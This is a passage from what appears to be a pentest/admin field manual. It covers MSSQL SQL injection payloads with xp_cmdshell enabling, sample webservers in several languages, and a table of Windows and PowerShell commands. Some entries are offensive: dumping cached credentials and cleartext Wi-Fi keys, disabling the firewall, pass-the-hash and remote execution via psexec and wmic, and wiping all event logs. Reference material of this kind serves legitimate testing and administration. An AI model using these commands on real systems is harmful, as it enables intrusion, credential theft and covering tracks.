varchar(4096)) FROM tablename)-- 
**After each iteration a new column name will be found, make sure 
add it to ** previously found column name ** separated by comma as 
on the next sample 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as 
varchar(4096)) FROM tablename AND name NOT IN('previously found row 
data'))-- 
Shell commands 
327 
EXEC master..xp_cmdshell  
**Need to have 'sa' user privileges 
Enabling shell commands 
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC 
sp_congigure 'xp_shell', 1; RECONFIGURE; 
REFERENCE: 
https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets 
https://github.com/swisskyrepo/PayloadsAllTheThings 
https://github.com/foospidy/payloads 
https://github.com/infoslack/awesome-web-hacking 
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ 
ONLINE TOOLS 
UNFURL  
Takes a URL and expands ("unfurls") it into a directed graph, 
extracting every bit of information from the URL and exposing the 
obscured. 
https://dfir.blog/unfurl/ 
https://dfir.blog/introducing-unfurl/ 
W
W 
WEBSERVER_Tricks 
ALL 
INFORMATIONAL 
WINDOWS 
Create a rudimentary webserver with various programming languages. 
Create a webserver in AWK: 
#!/usr/bin/gawk -f 
     BEGIN { 
       RS = ORS = "\r\n" 
       HttpService = "/inet/tcp/8080/0/0" 
       Hello = "" \ 
               "A Famous Greeting" \ 
               "Hello, world" 
       Len = length(Hello) + length(ORS) 
       print "HTTP/1.0 200 OK"          |& HttpService 
       print "Content-Length: " Len ORS |& HttpService 
       print Hello                      |& HttpService 
       while ((HttpService |& getline) > 0) 
          continue; 
       close(HttpService) 
     } 
Create a webserver in Go: 
328 
package main 
import ( 
  "fmt" 
  "log" 
  "net/http" 
) 
func main() { 
  http.HandleFunc("/", func(w http.ResponseWriter, req 
*http.Request) { 
    fmt.Fprintln(w, "Goodbye, World!") 
  }) 
  log.Fatal(http.ListenAndServe(":8080", nil)) 
} 
Create a webserver in JavaScript: 
Works with Node.js 
var http = require('http'); 
http.createServer(function (req, res) { 
    res.writeHead(200, {'Content-Type': 'text/plain'}); 
    res.end('Goodbye, World!\n'); 
}).listen(8080, '127.0.0.1'); 
Create a webserver in Perl: 
use Socket; 
my $port = 8080; 
my $protocol = getprotobyname( "tcp" ); 
socket( SOCK, PF_INET, SOCK_STREAM, $protocol ) or die "couldn't 
open a socket: $!"; 
  # PF_INET to indicate that this socket will connect to the 
internet domain 
  # SOCK_STREAM indicates a TCP stream, SOCK_DGRAM would indicate 
UDP communication 
setsockopt( SOCK, SOL_SOCKET, SO_REUSEADDR, 1 ) or die "couldn't 
set socket options: $!"; 
  # SOL_SOCKET to indicate that we are setting an option on the 
socket instead of the protocol 
  # mark the socket reusable 
bind( SOCK, sockaddr_in($port, INADDR_ANY) ) or die "couldn't bind 
socket to port $port: $!"; 
  # bind our socket to $port, allowing any IP to connect 
listen( SOCK, SOMAXCONN ) or die "couldn't listen to port $port: 
$!"; 
329 
  # start listening for incoming connections 
while( accept(CLIENT, SOCK) ){ 
  print CLIENT "HTTP/1.1 200 OK\r\n" . 
               "Content-Type: text/html; charset=UTF-8\r\n\r\n" . 
               "Goodbye, 
world!Goodbye, world!\r\n"; 
  close CLIENT; 
} 
Create a webserver using PHP: 
Goodbye, 
world!Goodbye, world!'; 
for (;;) { 
    // @ is used to stop PHP from spamming with error messages if 
there is no connection 
    if ($client = @socket_accept($socket)) { 
        socket_write($client, "HTTP/1.1 200 OK\r\n" . 
               "Content-length: " . strlen($msg) . "\r\n" . 
               "Content-Type: text/html; charset=UTF-8\r\n\r\n" . 
               $msg); 
    } 
    else usleep(100000); // limits CPU usage by sleeping after 
doing every request 
} 
?> 
Create a webserver using Python: 
Using wsgiref.simple_server module (Python Goodbye, World!" 
server = make_server('127.0.0.1', 8080, app) 
server.serve_forever() 
Using http.server module (Python 3) 
import threading 
330 
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer 
class HelloHTTPRequestHandler(BaseHTTPRequestHandler): 
  message = 'Hello World! 今日は' 
  def do_GET(self): 
    self.send_response(200) 
    self.send_header('Content-type', 'text/html; charset=UTF-8') 
    self.end_headers() 
    self.wfile.write(self.message.encode('utf-8')) 
    self.close_connection = True 
def serve(addr, port): 
  with ThreadingHTTPServer((addr, port), HelloHTTPRequestHandler) 
as server: 
    server.serve_forever(poll_interval=None) 
if __name__ == '__main__': 
  addr, port = ('localhost', 80) 
  threading.Thread(target=serve, args=(addr, port), 
daemon=True).start() 
  try: 
    while True: 
      # handle Ctrl+C 
      input() 
  except KeyboardInterrupt: 
    pass 
Create a webserver in UNIX shell: 
while true; do { echo -e 'HTTP/1.1 200 OK\r\n'; echo 'Hello, 
World!'; } | nc -l 8080; done 
REFERENCE:  
https://rosettacode.org/wiki/Hello_world/Web_server 
https://www.gnu.org/software/gawk/manual/gawkinet/gawkinet.html#Primitive-
Service 
W
W 
331 
WINDOWS_Commands 
ALL 
ADMINISTRATION 
WINDOWS 
COMMAND 
DESCRIPTION 
 | find /c /v "" 
Count the number of 
lines to StdOut 
arp -a 
Show ARP table with 
MACs 
cmdkey /list 
List cached 
credentials 
dir /b /s \ 
Search directory for 
specific file 
dism /online /disable-feature 
/featurename: 
Disable a particular 
feature installed 
dism /online /Enable-Feature 
/FeatureName:TelnetClient 
Install the Telnet 
service *ADMIN 
dism /online /get-features | more 
List available 
features for DISM 
*ADMIN 
for /F %i in ([file-set]) do [command] 
Windows iterate over 
files contents and 
do %i command 
for /L %i in ([start],[step],[stop]) do 
Windows counting FOR 
loop  
ipconfig /all 
Show IP configuration 
ipconfig /displaydns 
Show DNS cache 
net accounts /domain 
Show domain password 
policy 
net group "Domain Admins" /domain 
Show Domain Admin 
users 
net group "Domain Controllers" /domain 
List Domain 
Controllers 
net group /domain 
Show domain groups 
net localgroup "Administrators" 
Show local Admins 
net localgroup "Administrators" user /add 
Add a user to the 
Admin local group 
net share 
Show current mounted 
shares 
net share \\ 
Show remote host 
shares 
net share cshare C:\ 
/GRANT:Everyone,FULL 
Share local folder 
with everyone 
net time \\ 
Show time on remote 
host 
net use \\\ipc$ "" "/user:" 
Establish NULL 
session with remote 
host 
net use \\\ipc$  /user: 
Remote file system of 
IPC$ 
332 
net use r: \\\ipc$  
/user:\ 
Map remote drive to 
local r: drive 
net user /domain 
Show users in local 
domain 
net user   /add 
Add a user 
net view /domain 
Show host in local 
domain 
net view /domain: 
Show hosts in 
specified domain 
netsh firewall set opmode disable 
Turn off Windows 
Firewall 
netsh interface ip set address local dhcp 
Configure DHCP for 
interface 
netsh interface ip set address local 
static   1 
Configure LAN 
interface 
netsh interface ip set dns local static 
Configure DNS server 
for LAN 
netsh interface ip show interfaces 
List local interfaces 
netsh wlan export profile key=clear 
Export wireless 
password in plaintext 
netsh wlan show profiles 
Show local wireless 
profiles 
netstat –ano  | find  
Look for port usage 
every N seconds 
netstat –nao 
Show all TCP/UDP 
active ports and PIDs 
netstat –s –p  
Show detailed 
protocol stats 
nslookup -type=any example.com 
Show all available 
DNS records 
nslookup -type=ns example.com 
Show DNS servers of 
domain 
nslookup  
Perform reverse DNS 
lookup 
nslookup   
Perform a lookup with 
specific DNS server 
nslookup example.com 
Show A record of 
domain 
psexec /accepteula \\ -c 
C:\Tools\program.exe -u \ -
p  
Copy & execute 
program on remote 
host 
psexec /accepteula \\ -i -s 
"msiexec.exe /i setup.msi" -c setup.msi 
Install software on 
remote host 
psexec /accepteula \\ -s 
c:\windows\system32\winrm.cmd quickconfig 
-quiet 2>&1> $null 
Enable PowerShell on 
remote host silently 
psexec /accepteula \\ -s cmd.exe  
Run command as system 
on remote host 
333 
psexec /accepteula \\ -u 
\ -p  cmd.exe /c 
dir c:\file.exe  
Pass the hash run 
remote command 
psexec /accepteula \\ -u 
\ -p  -c -f 
\\\share\file.exe  
Execute file on 
remote host 
psexec /accepteula \\ hostname 
Get hostname of 
remote system 
psexec /accepteula \\,, 
hostname 
Get hostname of 
multiple remote 
systems 
reg add \\\\ 
Add a key to remote 
hosts registry 
reg export \ 
Export all subkeys/ 
values from Registry 
location 
reg query \\\\ /v 
Query remote host for 
registry key value 
Robocopy /ipg:750 /z /tee \\\ 
\\\ 
Robocopy directory 
with bandwidth 
limitations 
Robocopy   [file…] 
[options] 
Example syntax 
robocopy 
Robocopy C:\UserDir C:\DirBackup /E 
Copy all contents of 
local directory 
route print 
Show routing table 
runas /user: "file.exe [args]" 
Run file as specified 
user 
sc \\ create  
SC create a remote 
service on host 
sc \\ create  binpath= 
C:\Windows\System32\Newserv.exe 
start=auto obj=\ 
password= 
install windows 
service written in C# 
on remote host, with 
user/pass it should 
run as 
sc query 
Query brief status of 
all services 
sc query \\ 
Query brief status of 
all services on 
remote host 
sc query \\  
Query the 
configuration of a 
specific service on 
remote host 
sc query  
Query the 
configuration of a 
specific service 
sc query state=all 
Show services 
set 
Show environment 
variables 
334 
systeminfo /S  /U  /P 
Pull system info for 
remote host at IP 
taskkill /PID ## /F 
Force process id to 
stop 
tasklist /m 
Show all processes & 
DLLs 
tasklist /S  /v 
Remote host process 
listing for IP 
tasklist /svc 
Show all processes & 
services  
ver 
Get OS version  
wmic    
EXAMPLE 
wmic /node: /user: 
/password: process list full 
List all attributes 
of all running 
processes on remote 
host 
wmic /node: process call create 
"\\\share\file.exe" 
/user:\ /password: 
Execute file on 
remote system from 
hosted SMB share 
wmic /node: computersystem get 
username 
User logged in on 
remote host 
wmic logicaldisk list brief 
List logical disks 
wmic ntdomain list 
List Domain & Domain 
Controller 
information 
wmic process call create C:\ 
Execute specified 
process 
wmic process list full 
List all attributes 
of all running 
processes 
wmic qfe 
Show all patches 
applied 
wmic startupwmic service 
Start wmic service 
xcopy /s \\\ C:\ 
Copy remote dir to 
local 
POWERSHELL COMMANDS 
COMMAND 
DESCRIPTION 
 | Convert-to-Html | 
Out-File - FilePAth 
example.html 
Convert output of command to 
HTML report 
 | Export-CSV | 
C:\example.csv 
Export ouptut to CSV 
 | Select-Object 
,  | Export-CSV 
| C:\example.csv 
Expport only certain fields to 
CSV 
Add-Content 
Adds content to the specified 
items, such as adding words to 
a file. 
335 
Backup-SqlDatabase -
ServerINstance 
“Computer\Instance” -Database 
“Databasecentral” 
Create a backup of SQL database 
Clear-Host 
Clear the console 
Compare-Object 
Compares two sets of objects. 
Copy-Item 
Copies an item from one 
location to another. 
gdr -PSProvider ‘FileSystem’ 
List sizes of logical & mapped 
drives 
get-childitem C:\Users -Force | 
select Name 
Get users of the system 
get-command 
Get all commands 
Get-Content 
Gets the content of the item at 
the specified location. 
get-eventlog -list 
Get local eventlog status 
get-executionpolicy 
Get current execution policy 
get-help -name  
Get help about certain command 
get-history 
Get local command history 
get-localgroup | ft Name 
Get groups on the system 
get-localgroupmember 
Administrators | ft Name, 
PrincipalSource 
Get users of admin group 
get-localuser | ft Name, 
Enabled,LastLogon 
Users last login 
Get-Process 
View all processes currently 
running 
get-process ,  | 
format-list * 
Get certain processes 
information and format output 
get-service 
Show all services on local 
system 
get-service | Where-Object 
{$_.Status -eq “Running”} 
Show only running service on 
local system 
get-uptime 
Get local uptime 
get-winevent -list 
Get all local event logs status 
Group-Object 
Groups objects that contain the 
same value for specified 
properties. 
Invoke-WebRequest 
Gets content from a web page on 
the Internet. 
Measure-Object 
Calculates the numeric 
properties of objects, and the 
characters, words, and lines in 
string objects, such as files … 
Move-Item 
Moves an item from one location 
to another. 
New-Item 
Creates a new item. 
Remove-Item 
Deletes the specified items. 
336 
Resolve-Path 
Resolves the wildcard 
characters in a path, and 
displays the path contents. 
Resume-Job 
Restarts a suspended job 
Set-Content 
Writes or replaces the content 
in an item with new content. 
set-executionpolicy -
ExecutionPolicy 
Bypass execution policy to 
allow all scripts 
Set-Item 
Changes the value of an item to 
the value specified in the 
command. 
Set-Location 
Sets the current working 
location to a specified 
location. 
Set-Variable 
Sets the value of a variable.  
Show-Command 
Creates Windows PowerShell 
commands in a graphical command 
window. 
Sort-Object 
Sorts objects by property 
values. 
Start-Job 
Starts a Windows PowerShell 
background job. 
Start-Process 
Starts one or more processes on 
the local computer. 
Start-Service 
Starts one or more stopped 
services. 
stop-process -name "notepad" 
Stop the notepad process 
Suspend-Job 
Temporarily stops workflow 
jobs. 
Wait-Job 
Suppresses the command prompt 
until one or all of the Windows 
PowerShell background jobs 
running in the session are … 
wevtutil el | Foreach-Object 
{wevtutil cl "$_"} 
Delete all event log files 
wevutil el 
List names of all logs 
Where-Object 
Selects objects from a 
collection based on their 
property values. 
Write-Output 
Sends the specified objects to 
the next command in the 